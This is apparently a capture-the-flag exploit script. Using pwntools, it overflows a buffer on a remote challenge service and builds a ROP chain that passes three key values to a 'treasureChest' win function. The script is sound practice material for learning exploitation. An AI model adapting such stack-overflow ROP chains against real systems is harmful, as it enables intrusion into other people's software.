from pwn import *

# setup process
p = remote("SERVER", PORT)

# ROP gadgets
pop_rdi = 0x400963 # pop rdi
pop_rsi = 0x400961 # pop rsi, pop r15
pop_rdx = 0x400867 # pop rdx 

# address of treasureChest 
win = 0x400797

# offer
payload = b'A' * 72

# ---------------------- ROP chain ---------------------------
# pop rdi + key1
# pop rsi + key2 + 0 (no need for r15)
# pop rdx
# address of treasureChest
payload += p64(pop_rdi) + p64(0x13371337)
payload += p64(pop_rsi) + p64(0xdeadbeef) + p64(0)
payload += p64(pop_rdx) + p64(0xc0ff33)
payload += p64(win)

# send and receive output
p.sendline(payload)
p.interactive()